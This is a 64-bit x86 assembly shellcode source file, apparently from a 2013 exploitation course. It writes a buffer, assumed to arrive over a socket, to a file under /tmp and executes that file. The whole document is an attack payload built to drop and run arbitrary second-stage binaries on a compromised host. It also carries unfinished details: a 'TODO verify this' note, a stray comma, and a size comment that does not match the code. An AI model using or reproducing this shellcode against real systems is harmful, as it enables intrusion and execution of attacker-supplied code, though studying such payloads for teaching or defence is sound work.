	;; Evan Jensen 64bit Put a file in /tmp and execve it shellcode
	;; Paolo Soto
	;; Sun Mar 10 21:37:35 EDT 2013

	;; %eax = syscall number
	;; args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	;; args = rdi, rsi, rdx, rcx, r8, r9, then stack
BITS 64 
	global main
	
	%include "../include/syscalls64.s"

	%define openflags 0x42 ; O_CREAT|O_RDWR
	%define size 0xffff

	; assumption - rbx has the input (socket)
		
main:

	; rdi = 0
	; rsi = size
	; rdx = 0x3
	; rcx = 0x2
	; r8  = rbx
	; r9  = 0

	; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
	;mov r8, rdx		; r8 = input

	xor edi, edi		; rdi = 0

	xor edx, edx
	xor eax, eax
	xor ecx, ecx
	xor r8, r8

	xor esi, esi
	
	bts esi, 22		; rsi = 4M
	xor  r9, r9
	mov dl, 0x3		; rdx = 0x3
	mov cl, 0x2		; rdl = 0x2

	mov al, __NR_mmap
	syscall 		; call mmap

	; rax has the mmap buffer
	; temporary assignments:
	mov r8, rax		; r8 = buffer 
	mov r9, rsi		; r9 = size

	; open(filename, O_CREAT|O_RDWR, 0700)
	xor eax, eax
	xor edi, edi
	xor edx, edx
	push rax,
	push qword stackcookie  ; TODO verify this
	push 0x706d742f		; stack = /tmp/filename\0
	mov rdi, rsp		; rdi = stack
	xor esi, esi	
	mov sil, 0x42		; ril = O_CREAT|O_RDWR
	mov dl, 0x7
	shl edx, 0x6
	mov al, __NR_open
	syscall			; call open
	
	; write(output, buffer, size)
	mov rdi, rax		; rdi = output
	mov rsi, r8		; rsi = buffer
	mov rdx, r9		; rdx = size
	xor eax, eax
	mov al, __NR_write
	syscall			; call write

	; exec(filename, 0, 0)
	mov rdi, rsp		; rdi = filename
	xor esi, esi		; rsi = 0
	xor edx, edx		; rdx = 0
	xor eax, eax		; rax = 0
	mov al, __NR_execve	
	syscall			; call execve
